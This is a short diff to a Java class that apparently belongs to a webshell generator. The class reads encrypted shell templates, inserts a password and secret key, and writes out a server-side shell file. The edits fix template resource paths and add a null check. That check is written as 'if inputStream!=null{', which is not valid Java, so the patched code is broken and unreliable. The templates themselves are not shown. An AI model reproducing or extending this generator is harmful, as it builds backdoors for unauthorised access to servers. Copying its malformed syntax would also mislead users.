@@ -15,8 +15,7 @@ class Generate {
       byte[] data = null;
 
       try {
-         InputStream inputStream = Generate.class.getResourceAsStream("./template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");
-         String globalCode = new String(functions.readInputStream(inputStream));
+         InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");         String globalCode = new String(functions.readInputStream(inputStream));
          inputStream.close();
          globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
          inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Code.bin");
@@ -25,9 +24,11 @@ class Generate {
          Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
          if (selectedValue != null) {
             String suffix = (String)selectedValue;
-            inputStream = Generate.class.getResourceAsStream("src/main/java/shells/cryptions/JavaAes/template/shell." + suffix);
+            inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
             String template = new String(functions.readInputStream(inputStream));
-            inputStream.close();
+            if inputStream!=null{
+               inputStream.close();
+            }
             if (suffix.equals(SUFFIX[1])) {
                globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
                code = code.replace("<", "&lt;").replace(">", "&gt;");
